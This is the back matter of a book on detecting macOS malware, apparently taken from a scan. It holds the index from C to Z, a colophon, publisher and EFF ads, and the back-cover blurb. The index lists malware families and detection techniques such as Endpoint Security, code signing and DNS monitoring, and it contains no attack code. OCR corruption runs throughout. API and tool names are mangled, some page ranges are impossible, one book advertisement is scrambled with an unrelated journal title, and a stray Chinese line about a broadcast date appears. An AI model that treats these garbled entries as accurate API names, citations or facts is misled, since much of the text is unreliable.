case studies, 313–326 DazzleSpy malware, 315–319 Shazam, 313–315 3CX supply chain attack, 319–326 certificate authority chain, 80 CFBundleCopyExecutableArchitectures ForURL API, 250 chained supply chain attack, 320 checkSignature project, 76, 79, 84, 88, 94–95 Chropex (ChromeLoader), 9 clients Endpoint Security, 185, 199–200 XPC, 269–271 CloudMensis malware, 40–41, 44–49, 52, 54, 56 code signing, 75–76 ad hoc signatures, 81–82 Apple requirements for, xxvi–xxvii defined, 24 disk images and, 78–84 Endpoint Security process monitor, 195–197 error codes, 97 false positives and, 75, 96–97 importance of in malware detection, 76–78 notarization, 77, 82–84 on-disk Mach-O binaries and, 93–95 in packages, 84–93 revocations, 77 running processes and, 95–96 XPC and, 268–271 codesign utility, 78–79, 85, 93, 129, 256 CoinMiner malware, 8, 33 CoinTicker malware, 317 Coldroot malware, 28–29, 63 com.apple.developer.support-security.client entitlement, xxvii, 180 com.apple.quarantine extended attribute, 316–317 Contents/Library/SystemExtensions/ directory, 299, 303 CoreMediaIO Framework, 285–286 adding a property listener, 285 core media I/O subsystem, 142, 151–152, 289–291 CPU utilization, processes, 35–36

330    Index

---

computing CPU percentage in use, 35-36 flavor argument, 35 streaming log messages, 151 CreativeUpdate malware, 79, 84 Crisis malware, 142, 280, 314 CrowdStrike, 9, 320 CSCommon.h file, 97

## D

DÃ* APIs, 56–57 data collection, 1–2. See also code signing: network state and statistics; parsing binaries; processes persistence, 119–137 Background Task Management, 123–136 DazzleSpy malware, 121–123 DumpBTM project, 130–137 LaunchAgents directories, 121–123 WindTail malware, 120–121 DazzleSpy malware, 7, 23, 33, 127, 220 code signing, 324 exploit detection, 315–317 extracting symbols, 59–60, 62 network access, 319 persistence and, 121–123, 317–319 default mute set, 210 delegates and delegate methods DNSMonitor, 301 network monitoring, 168, 172 system extensions, 161, 163 XPC, 266 dependencies, binary analyzing, 56–59 finding dependency paths, 54–56 packer detection and, 63 deserialization, 130–134 detection heuristics. See heuristic-based detection approach device connections and disconnections, 286–288 disabling Apple Mobile File Integrity, xxvii, 160, 181 System Integrity Protection, xxvii, 160, 181

DiskArbitration framework, 54, 56 disk images ad hoc signatures, 80 certificate authority chain, 81 code object references, 80–81 code signing and, 78–84 extracting code signing information, 79–82 manually verifying signatures, 78–79 notarization status, 82–84 static code reference, 80 verbose output, 79 dispatch_semaphore_wait API, 216 DNS cache dumping, 304–307 DNSMonitor, 297–311 blocking DNS traffic, 307–310 classifying endpoints, 310 DNS cache dumping, 304–307 domain name registrar, 310 historical DNS records, 310 interprocess communication, 303–304 network extensions, 298–303 printing DNS packet to universal log, 303–304 provisioning profiles, 298–299 DNS monitoring, 157–169 activating system extensions, 160–161 identifying responsible processes, 168–169 NetworkExtension framework, 159–160 parsing DNS requests, 164–165 parsing DNS responses, 165–168 writing system extensions, 162–169 DNSProxyProvider class, 303 Dock, 19, 301 Documents directory monitoring file-open events in, 211–212 WindTail malware and, 227 domain name registrar, 310 Dummy malware, 102–103, 111, 117, 159, 169 DumpBTM project, 130–137 accessing metadata, 134–135 deserializing files, 131–134

Index 331

---

DumpBTM project (continued) finding database path, 130–131 identifying malicious items, 135–136 KnockKnock tool and, 241 using DumpBTM in your own code, 136–137 dyld cache, 86–87, 145 dyld-shared-cache-extractor tool, 87 dyld hijacking, 217, 249 dyldib instructions, 246–248 dyldib proxying, 249–252

## E

Eleanor malware, 280 Electron framework, 249 ElectroRAT, 8 encrypted binaries, 70–71 endianness, 41, 43, 50–51 endpoints, DNSMonitor, 310 Endpoint Security, 179–203 authorization events, 213–222 clients, 185 detecting removal of quarantine attribute, 316 entitlements, 254–256 events, 182–184 authorization events, 183, 213–222 event handling, 185–190 mute inversion, 209–212 muting, 206–212 printing out file-open Endpoint Security event, 219 proof-of-concept file protector, 223–228 file monitoring, 200–203 handler blocks, 185 header files, 182–183 mute inversion, 209–212 muting events, 206–212 prerequisites, 191 process monitor, 190–200 proof-of-concept file protector, 223–228 workflow, 180–190

EndpointSecurity.h header file, 182

entitlements applying for, 254 BlockBlock tool and, 254–256 com.apple.developer.endpoint-security .client, xxvii, 180 enabling in Xcode, 255–256 provisioning profiles, 255 registering App ID, 254–255 entropy encrypted binaries, 70 packed binaries, 67–70 enumerateProcesses project, 4. See also processes environment information, processes, 19–24 converting process information into string object, 22–23 creating shared memory objects, 20 declaring required variables, 20 extracting global data, 21 extracting size of response data, 22 resolving function pointer, 21 tracing process ID back to launch item property list, 23–24 e_ppid member, process hierarchies, 14–15 error codes, code signing, 97 ESClient.h header file, 182 ES_EVENT_TYPE_AUTH_DELETETEXTATTR event, 219 ES_EVENT_TYPE_AUTH * events, 201–202 ES_EVENT_TYPE_NOTIFY_BTM_LAUNCH_ITEM _ADD event, 261–262 ES_EVENT_TYPE_NOTIFY_BTM_LAUNCH_ITEM REMOVE event, 261 ES_EVENT_TYPE_NOTIFY_CLOSE event, 202 ES_EVENT_TYPE_NOTIFY_CREATE event, 201 ES_EVENT_TYPE_NOTIFY_EXEC event, 184–186, 193–194, 197–198, 221 ES_EVENT_TYPE_NOTIFY_RENAME event, 202 ES_EVENT_TYPE_NOTIFY_UNLINK event, 202 es_invert mutating API, 210 esLogger utility, 183–184, 186 ESMessage.h header file, 182, 185, 201 es_message_t structure, 185–186, 201, 216 es_muted_paths_events API, 210

---

es_mute_process API, 208 es_mute_event_events API, 208 ESPlayground project, 180–182, 190, 205, 207, 211–213, 215, 229, 227 ESTypes.h header file, 182, 206, 210, 215 EvilQuest malware, 79, 84–85, 93 executable packers, xxii, 62–67 execution architecture, processes, 32–34 execution state, processes, 32 exfiltration of data, 157, 326 exit status, Endpoint Security process monitor, 199 exploit detection, 315–317

## F

false positives, code signing, 75, 96–97 fat binaries. See universal binaries file monitoring Endpoint Security, 200–203 3CX supply chain attack, 320–322 file protector, Endpoint Security, 223–228 allowing all file accesses, 224–225 denying all file accesses, 225 extracting process paths and filepaths, 225–226 granting file access for platform and notarized processes, 226–227

file utility, 40 filter data providers, 159, 170–176 enabling, 170–171 querying the flow, 173–174 running monitor, 174–176 writing extension for, 171–172 Finder, 19, 212, 301 Flashback malware, 246, 248 FruitFly malware, xxii, 142, 279–280, 314 fully qualified domain name (FQDN), 164

## G

Genioe malware, 11


getaddrinfo API, 110


GetProcessForPID API, 17-19

## H

HackingTeam installer, 70-71 handler blocks, Endpoint Security, 185 header files, Endpoint Security, 182-183 heuristic-based detection approach.

See also code signing:

Objective-See tools code signing and, 76 CPU utilization, 35-36 detecting obfuscation, 62 downsides of, xxii false positives, xxii, 75, 96-97 file monitoring, 200 hidden directories and, 6-7 network monitoring, 174 protecting files in user's home directory, 225 hierarchies, process, 13-19 Endpoint Security process monitor, 193 parent, 14-17 retrieving information with Application Services APIs, 17-19 historical DNS records, 310 Hopper, 87, 145 host-based data collection, 102 How to Reverse Malware on macOS

Without Getting Infected (Stokes), xxviii

## |

Info.plist file browser extensions, 245–246 checking binary origins, 218 DNSMonitor, 299–300, 303 dynamic library insertion, 248 writing system extensions, 171 integrated development environment (IDE), xxvi Intel binaries, 32 Internet Protocol (IP) sockets, 107, 109–110 interprocess communication (IPC) AF sockets, 105 DNSMonitor, 303–304 XPC, 265

---

Invisible Internet Project (I2P), 8 IPStorm malware, 63, 66, 69, 142 iWebtUpdate binary, 11, 158, 167-168

## J

JSON

building JSON-ified string, 240 converting object properties to 238–240 output from KnockKnock, 247

## К

KeRanger malware, 7 KERN_PROCADES25 value, 11–12 KeySteal malware, 86, 93 kill system API, 82 kinfo _ proc structure, process hierarchies, 14–15 KnockKnock tool, 233–252 Background Task Management, 241–242 browser extensions, 242–245 building list of loaded libraries with, 249 command line options, 235 DazzleSpy and, 319 determining whether item is a binary, 250 dylib hijacking, 249 dylib insertions, 246–248 dylib proxying, 249–252 enumerating dependencies of running processes, 251 ItemBase class, 238 persistent item types, 238–240 plug-ins, 235–237, 240–252 positive detections/antivirus engines, 240 system _ profiler approach, 247 user interface, 234–235 khStatSrcKeyTxBytes key, 117 khStatSrcKeyTxBytes key, 117 kp _ eproc structure, process hierarchies, 14–15 kSecCodeInfoCertificates key, 81–82 kSecCodeInfoFlags key, 82

## L

LaunchAgents directions, 121–123 launch1 utility, 19–20 launch daemon, 121, 257–258. See also persistence Launch Services APIs, 243, 246 Lazarus API group, 13–14 LC_SYMTAB load command, 60 leaf signature, 90 libqroc APIs, 4 /Library/SystemExtensions/<UUID>/ library, 303 listeners, XPC, 265–266 load commands, Mach-O binaries, 53 loaded libraries building list of with KnockKnock, 249 enumerating, 24–28 LoggingSupport framework, 145–146, 148, 152, 289 log monitoring, 141–152 extracting log object properties, 148–151 remote logins, 142 resource consumption, 151–152 streaming log data, 146–148 TCC mechanism, 142–143 unified logging system, 143–146 webcam access, 142 lsof tool, 30–31 LSHaredFileListCreate API, 120 LSHaredFileList<ItemURL API, 120 LuLu software, 78–79, 84, 170, 307, 319, 326

## N

MachO* APIs, 47–50 Mach-O binaries code signing and, 93–95 extracting dependencies, 54–59 extracting symbols, 59–62 load commands, 53 Mach-O headers, 50–52 slices, 40, 43, 47–50 universal binaries, 39–50 mach_timebase_info API, 216

---

MacStealer malware, 209–210, 212, 225 malicious networking activity, 102–105 Malware Removal Tool (MRT), 76–77 management information base (MIB) array, 11 metadata, accessing, 134–135 microphone, 282–285. See also audio monitoring Microsoft AutoRuns tool, 233 Mokes malware, 57–58, 142, 280, 314 MRT (Malware Removal Tool), 76–77 mute inversion, Endpoint Security, 209–212 audit tokens and, 210 default mute set and, 210 monitoring directory access, 211–212

muting events, Endpoint Security, 206–212

## N

name error, DNS traffic, 309 names, process, 8-9 NEDNSProxyManager object, 161-162 NFilterFlow objects, 172-174 NFilterManager object, 170-171 NFilterSocketFlow objects, 174 NNetworkRule object, 172 netbottom command line tool, 112 Netquette tool, 104 nettop utility, 112, 156 network access, DazzleSpy, 319 network-centric data collection, 102 network extension, DNSMonitor, 302-303 NetworkExtension framework, xxiii, 111-117, 159-160, 297-301 activation, 159-160 DNS monitoring, 157-169 filter data providers, 169-175 indentifying responsible process, 168-169 methods, 163 prerequisites, 159, 298 network monitoring, 155-176 DNS monitoring, 157-169 filter data providers, 169-175

参考文献

snapshots, 156-157 3CX supply chain attack, 322-323 network sockets, 106-111 network state and statistics, 101-118.

See also NetworkStatistics framework capturing, 105-111 extracting network sockets, 106-107 host-based vs. network-centric collection, 102 malicious networking activity, 102-105 retrieving process file descriptors, 106 socket details, 107-111

NetworkStatistics framework, 111-112 callback logic, 114-115 creating network statistic managers, 113-114 kNSTatSrcKeyxBytes key, 117 kNSTatSrcKeyxBytes key, 117 linking to, 113 queries, 115 notarization detecting, 77 disk images, 82-84 packages, 91-99 notification events, 183-184, 200-203 device added, 286-287 device removed, 286-287

NSRunningApplication object, 8-9 NSTask API, 26 NSTatManagerCreate API, 113 NSTatManagerQueryAllSources Descriptions API, 156-157 NSUserDefaults class, 292 NSXPCConnection class, 267 NSXPCListenerDelegate protocol, 265-266

NuKeSp malware, 7 NX* APIs, 42-47 NODOMAIN response, DNS traffic, 309-310

## 0

Objective-C language, xxvi, 59 extracting log object properties, 148-151

Index   335

---

Objective-C language (continued) performSelector : method, 134 private classes, 89 Objective-See tools, xxiv, 231–232 BlockBlock tool, 253–276 DNSMonitor, 297–311 KnockKnock tool, 233–252 LuLu software, 78–79, 84, 170, 307, 319, 326 Oversight tool, 280–295 TaskExplorer, 25 OceanLotus malware, 317 open files, 28–31 ls6f tool, 30–31 proc _ pidinfo API, 29–30 oRAT malware, 33, 63, 104–105 os _ log create API, 303 OSLogEventProxy object properties, 150–151 OSSystemExtensionRequest class, 161 OSSystemExtensionRequestDelegate protocol, 161 otool command confirming code accuracy, 45 detecting encrypted binaries, 70 enumerating network connections, 112 finding dependency paths, 56 Mach-O headers and, 52 reverse engineering log APIs, 145 OverSight tool, 280–295 Block option, 280 camera monitoring, 285–286 device connections and disconnections, 286–288 disabling, 293–294 executing user actions, 292–293 extracting property values, 285 filtering onto and coremedia messages, 290 LogMonitor class, 280–290 mic monitoring, 282–284 parsing messages to detect responsible process, 291 predicate evaluation, 151–152 property listener, 281–286 responsible process identification, 288–291

sample utility, 288 scripts and, 291-293 stopping, 293

## P

PackageKit framework, 86–89 packages accessing framework functions, 88–89 code signing and, 84–93 notarization status, 91–92 reverse engineering pkgutil utility, 86–88 validating, 90–91 packed binaries, 62–70 calculating entropy, 67–70 dependencies, 65 section and segment names, 63–67 symbols, 63 packers (executable packers), xxii, 62–67 Palomino Labs, 105 Parallels, xxviii parent hierarchy, 14–17 ParentPSN key, 19 parsing binaries extracting dependencies, 54–59 extracting symbols, 59–62 load commands, 53 Mach-O binaries, 50 packed binaries, 62–70 universal binaries, 39–50 paths, process, 6–8 of deleted binaries, 7–8 identifying hidden files and directories, 6–7 persistence, 119–137 Background Task Management, 123–136 BlockBlock, 258–264 DazzleSpy malware, 121–123, 317–319 DumpBTM project, 130–137 KnockKnock, 240–251 LSHaredFilelistCreate API, 120 LSHaredFilelistInsertItemURL API, 120 ProgramArguments key, 122

---

RunAtLoad key, 122–123 WindTail malware, 120–121 persistence enumerator: See KnockKnock tool persistence monitor, See BlockBlock tool persistent item types, KnockKnock tool, 238–240 pkgutil utility, 78 package notarization, 91 reverse engineering, 86–89 verifying signature, 84–86 plug-ins BlockBlock tool, 258–261 KnockKnock tool, 235–237 base scan method, 236 initializing by name, 237 methods of base class plug-in, 236 properties of base class plug-in, 236 updating global list of persistent items, 237 positive detections/antivirus engines, 240 processes, 3–38 arguments, 9–13 audit tokens, 5–6 code signing and, 24, 95–96 CPU utilization, 35–36 enumerating, 4–5 environment information, 19–24 execution architecture, 32–34 execution state, 32 loaded libraries, 24–28 open files, 28–31 paths, 6–8 process hierarchies, 13–19 start time, 34–35 validating names, 8–9 process file descriptors, retrieving, 106 ProcessInformationCopyDictionary API, 18–19 process monitor, Endpoint Security, 190–200 arguments, 197–199 audit tokens, 199 binary architecture, 194–195

code signing, 195-197 exit status, 199 extracting process information, 192 extracting process objects, 191-192 hierarchies, 193 process paths, 192-193 script paths, 193-194 stopping the client, 199-200 subscribing to events, 191 process monitoring, 3CX supply chain attack, 323-325 process serial numbers, 17-19 procinfo command line option, 19-20 proc_listallpids API, 4-5 proc_pid* APIs, 102, 103-107, 111 proc_pidinfo API, 29-30 PROC_PIDPATHINFO_MAXSIZE constant, 6 proc_pid_rusage API, 35 ProgramArguments key, 122 property listeners, 281-286 audio monitoring, 282-285 camera monitoring, 285-286 provisioning profiles BlockBlock tool, 255-256 DNSMonitor, 298-299 NetworkExtension framework, 160 psi structure, 108

## Q

qtn_file_* APIs, 218

## R

ransomware, 7, 120, 139, 200 redacted WHOIS data, 310 remote access tools (RATs) CoinMiner, 8 ColdRoot, 28-29, 63 ElectroRAF, 8 remote connections, enabling, 271-272 remoteEndpoint instance variable, 173-174 remote loginns, 142 remote methods, XPC, 275-276 request:actionForReplacingExtension: withExtension: delegate method, 161 Index 337

---

request:didFailWithError: delegate method, 161 request:didFinishWithResult: delegate method, 161 request:needsUserApproval: delegate method, 161 resources, xxix respondsToSelector: method, 89 response packets, DNS traffic, 308 responsibility_get_pid_responsible _for_pid_API, 16-17 responsible process identification, 16-19, 168-169, 174, 188-189, 193, 226, 288-291 reverse engineering Activity Monitor utility, 30 log APIs, 145-146 pkgutil utility, 86-89 revocations, 77 rShell malware, 33 runAtLoad key, 122-123

## s

Safari browser extensions, 243-245 enumerating, 243 parsing output containing, 245 URLsForApplicationsToOpenURL: method, 243 sample utility, 288 SCDynamicStoreCopyConsoleUser API, 211 scripts, 193-194, 291-293 SecAssessmentCreate API, 83, 94 SecAssessmentTicketLookup API, 83, 91-92 SecCodeCopyGuestWithAttributes API, 95 SecCodeCopyPath API, 96 SecCodeCopySigningInformation API, 81 SecRequirementCreateWithString API, 82 SecStaticCodeCheckValidity API, 81-83, 93-94, 97 SecStaticCodeCreateWithPath API, 80 section and segment names: packed binaries, 63-67 SecTranslateIsTranslatedURL API, 217-218

self-delete malware, 325 serialization, 126-127 sftool utility, 127-130 Shazam, 313-315 Shlayer malware, 9, 213, 242 SIDUSR1 signal, DNS traffic, 305-306 SIP, See System Integrity Protection slices, Mach-O binaries, 40, 43, 47-50 snapshots, xxviii, 101, 112, 115, 139, 155-157 soi_proto structure, sockets, 108 Spotlight service, 206-207, 246 startSystemExtensionMode method, 162-163 start time, processes, 34-35 swap _ APIs, 43-44 Swift language, xxvi symbols, binary extracting, 59-62 packed binaries, 63 sysctl API, 11, 15, 34 sysctlbyname API, 4 sysctlname@tomlib API, 34 system extensions. See also

NetworkStatistics framework activating, 160-161 entitlements, 298-300 identifying responsible processes, 168-169 prerequisites for, 160 writing, 162-169 System Integrity Protection (SIP), 254 disabling, xxvii, 160, 181 entitlements and, xxvii re-enabling in Recovery Mode, xxviii system monitoring. See Endpoint Security; log monitoring; network monitoring System Preferences application, 123-124 system_profiler, 247

## T

TAOMM repository, xcv TaskExplorer tool, 25

---

TCC (Transparency, Consent, and Control) mechanism, 142-143, 223, 292 TCP protocol querying for statistics about network events, 115 sockets, 105, 108 3CX supply chain attack, 310, 319-326 BlockBlock tool, 324-325 code signing, 323-324 DNS monitoring and, 158-159 exfiltration, 326 file monitoring, 320-322 network monitoring, 322-323 process monitoring, 323-325 self-deletion, 325 translocation, 217-218 Transport Layer Security (TLS) package, 105

## U

UDP protocol DNS traffic, 163 querying for statistics about network events, 115 sockets, 105, 108 universal binaries, 59–50 fat_arch structures, 41–47 FAT_CIGAM value, 41, 43–44 fat_header structure, 40–41, 43–47 inspecting, 40–42 Macho* APIs, 47–50 NX* APIs, 42–47 parsing, 42 swap_* APIs, 43–44 universal logging subsystem, 143–146 DNSMonitor, 303–304 manually interfacing with, 144–145 Oversight tool and, 288–289 reverse engineering log APIs, 145–146 URLsForApplicationsToOpenUrl: method, 243

## v

verifyReturningError: method, 90


virtual machines analyzing malware safely, xxvii-xxviii disabling SIM and AMFI, 160 VirusTotal, 168, 234, 239-240, 242, 319 vmmap tool, 24-26 VMware, xxviii

## W

webcam access, 142. See also Oversight tool WindTail malware, 95, 120–121, 227, 242 Wireshark, 127, 135, 158 workflow, Endpoint Security, 180–190 clients, 185 event handling, 185–190 events of interest, 182–184 handler blocks, 185

## X

Xcode, xxvi, 255–256 XCSSET malware, 142, 223, 317 XPC, 265–275 authorizing clients, 269–271 client requirements, 270–271 delegates, 266 extracting audit tokens, 266–268 initiating connections, 274 listeners, 265–266 methods, 272–274 protocols, 271–273 remote connections, 271–272 remote methods, 275–276 verifying clients, 268–271 XProtect, 150, 183, 280

## Y

Yort malware, 13-14

## Z

zombie processes, 32 Zulu malware, 24–28, 58–59, 63

---


---

The Art of Mac Malware, Volume 2, is set in New Baskerville, Futura, Dogma, and TheSanMono Condensed.

---


---

## RESOURCES

Visit https://nostarch.com/art-mac-malware-v2 for errata and more information.

More no-nonsense books from

![Figure](figures/ArtofMacMalwareVol2_page_375_figure_003.png)

NO STARCH PRESS

![Figure](figures/ArtofMacMalwareVol2_page_375_figure_005.png)

THE ART OF MAC MALWARE, VOLUME I

The Guide To Analyzing Malicious Software

BR: Patrick Warlie Phone: 01-477-71385-0194

![Figure](figures/ArtofMacMalwareVol2_page_375_figure_009.png)

THE ART OF ARM ASSEMBLY, VOLUME I

64-Bit ARM Machine Organization and Programming

RE RANDALL HYDE REWARD ST. 878-17185-0292

![Figure](figures/ArtofMacMalwareVol2_page_375_figure_013.png)

PRACTICAL MALWARE ANALYSIS The Hands-On Guide to Detecting

BY MICHAEL SKORSKI AND ANDERON HONG 800 pp, $59.99 ISBN 978-1-59327-290-6

![Figure](figures/ArtofMacMalwareVol2_page_375_figure_016.png)

EVASIVE MALWARE

A Field Guide to Detecting, Analyzing, and Defeating Advanced Threats

BY: KUCC Kyle JOURNAL OF POLYMER CHEMISTRY ISSN 1743-7185

![Figure](figures/ArtofMacMalwareVol2_page_375_figure_020.png)

THE ANDROID MALWARE HANDBOOK

Detection and Analysis by Human and Machine

BI QIAN HAN ET AL. 958-962

![Figure](figures/ArtofMacMalwareVol2_page_375_figure_024.png)

WINDOWS SECURITY INTERNALS

A Deep Dive into Windows Authentication, Authorization, and Auditing

B: JAMES FOWSHAW JAMES FOWSHAW ISBN 978-1-7185-0194-0

PHONE:

800,420,7240 or 415,863,9900

EMAIL:

SALES@NOSTARCH.COM

WFR3

WWW.NOSTARCH.COM

2019年6月27日 , 官方公告:《新》於2020年3月28日開始播放。

---


---

![Figure](figures/ArtofMacMalwareVol2_page_377_figure_000.png)

Never before has the world relied so heavily on the Internet to stay connected and informed. That makes the Electronic Frontier Foundation’s mission—to ensure that technology supports freedom, justice, and innovation for all people— more urgent than ever.

For over 30 years, EFF has fought for tech users through

activism, in the courts, and by developing software to overcome

obstacles to your privacy, security, and free expression. This

dedication empowers all of us through darkness. With your help

we can navigate toward a brighter digital future.

![Figure](figures/ArtofMacMalwareVol2_page_377_figure_003.png)

LEARN MORE AND JOIN EFF AT EFF.ORG/NO-STARCH-PRESS

---

"If you want to study these techniques, you'd better learn from the best."

—Maria Markstedter, founder of Azeria Labs and Forbes Person of the Year in Cybersecurity

As renowned Mac security expert Patrick Wardle notes in The Art of Mac Malware, Volume 2, the substantial and growing number of Mac users, both personal and enterprise, has created a compelling incentive for malware authors to ever more frequently target macOS systems. The only effective way to counter these constantly evolving and increasingly sophisticated threats is through learning and applying robust heuristic-based detection techniques.

To that end, Wardle draws upon decades of experience to guide you through the programmatic implementation of such detection techniques. By exploring how to leverage macOS's security-centric frameworks (both public and private), diving into key elements of behavioral-based detection, and highlighting relevant examples of real-life malware, Wardle teaches and underscores the efficacy of these powerful approaches.

Across 14 in-depth chapters, you'll learn how to:

- Capture critical snapshots of system state to
reveal the subtle signs of infection
Enumerate and analyze running processes
to uncover evidence of malware
- Parse the macOS's distribution and binary
file formats to detect malicious anomalies
Utilize code signing as an effective tool to
identify malware and reduce false positives
Write efficient code that harnesses the full
potential of Apple's public and private APIs
Leverage Apple's Endpoint Security and
Network Extension frameworks to build
real-time monitoring tools
This comprehensive guide provides you with the knowledge to develop tools and techniques, and to neutralize threats before it's too late.

## About the Author

PATRICK WARDE is the founder of Objective-See, a nonprofit dedicated to creating free, open source macOS security tools and organizing the "Objective by the Sea" Apple security conference. Wardle is also the co-founder and CEO of DoubleYou, a cybersecurity startup focused on empowering the builders of Apple-focused security tools. Having worked at both NASA and the National Security Agency and having presented at countless security conferences, he is intimately familiar with aliens, spies, and talking nerdy.

![Figure](figures/ArtofMacMalwareVol2_page_378_figure_010.png)

THE FINEST IN GEEK ENTERTAINMENT™ www.nostarch.com

